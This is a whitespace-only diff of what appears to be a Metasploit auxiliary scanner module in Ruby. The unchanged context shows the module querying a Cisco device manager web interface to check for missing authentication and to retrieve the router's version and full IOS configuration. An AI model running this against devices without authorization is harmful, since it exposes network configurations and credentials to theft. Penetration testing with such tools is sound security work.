@@ -15,13 +15,13 @@ require 'msf/core'
 
 
 class Metasploit3 < Msf::Auxiliary
-	
+
 	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::HttpClient
-	
+
 	# Include Cisco utility methods
 	include Msf::Auxiliary::Cisco
-	
+
 	# Scanner mixin should be near last
 	include Msf::Auxiliary::Scanner
 
@@ -31,7 +31,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 					This module gathers data from a Cisco device (router or switch) with the device manager
 				web interface exposed. The BasicAuthUser and BasicAuthPass options can be used to specify
-				authentication.	
+				authentication.
 			},
 			'Author'		=> [ 'hdm' ],
 			'License'		=> MSF_LICENSE,
@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-	
+
 		res = send_request_cgi({
 			'uri'  		=>  "/exec/show/version/CR",
 			'method'   	=> 'GET'
@@ -61,11 +61,11 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("#{rhost}:#{rport} Unexpected response code from this device #{res.code}")
 			return
 		end
-					
+
 		if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
 			print_good("#{rhost}:#{rport} Successfully authenticated to this device")
-	
-			# Report a vulnerability only if no password was specified		
+
+			# Report a vulnerability only if no password was specified
 			if datastore['BasicAuthPass'].to_s.length == 0
 
 				report_vuln(
@@ -81,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
 				)
 
 			end
-				
+
 			res = send_request_cgi({
 				'uri'  		=>  "/exec/show/config/CR",
 				'method'   	=> 'GET'
@@ -94,9 +94,9 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
 			end
-				
+
 		end
-		
+
 	end
 
 end
